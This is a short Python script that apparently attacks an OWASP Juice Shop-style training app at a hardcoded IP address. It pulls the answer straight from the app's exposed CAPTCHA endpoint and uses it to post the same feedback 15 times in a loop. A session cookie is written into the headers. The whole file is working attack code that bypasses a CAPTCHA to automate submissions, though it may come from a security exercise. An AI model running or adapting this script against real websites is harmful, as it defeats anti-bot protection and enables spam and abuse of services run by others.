import requests
import json

post_url = 'http://65.49.195.58:3000/api/Feedbacks'
captcha_url = 'http://65.49.195.58:3000/rest/captcha/'
headers = {
    'Content-Type': 'application/json;charset=UTF-8',
    'Cookie': 'cookieconsent_status=dismirequests; continueCode=o1o17zpBWv3DENkqXL89JQYOA6gHbuXH8clgdwM2ZV4jgKnxR5rmyabPle6j; io=6xLNWoRR4wKbTGiEAAAK'
}
data = {"comment": "terrrible", "rating": 5, "captcha": "55", "captchaId": 5}

for _ in range(15):
    captcha = requests.get(captcha_url).json()
    data['captcha'] = captcha['answer']
    data['captchaId'] = captcha['captchaId']
    print(requests.post(post_url, data=json.dumps(data), headers=headers, timeout=1).text)